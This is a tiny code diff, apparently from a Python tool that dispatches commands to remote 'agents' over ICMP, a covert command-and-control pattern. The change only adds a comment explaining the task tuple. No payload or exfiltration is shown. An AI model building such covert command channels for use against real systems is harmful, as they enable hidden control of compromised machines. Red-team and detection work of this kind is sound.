@@ -44,6 +44,7 @@ def run_icmp(stop_event, task_manager):
                     if task is None:
                         answer = "TASK|null|".encode('utf-8')
                     else:
+                        #task[0] - task_id, task[1] - task_command
                         answer = f"TASK|{task[0]}|{task[1]}|".encode('utf-8')
                         print("[+/ICMP]Задача отправлена агенту.")
 
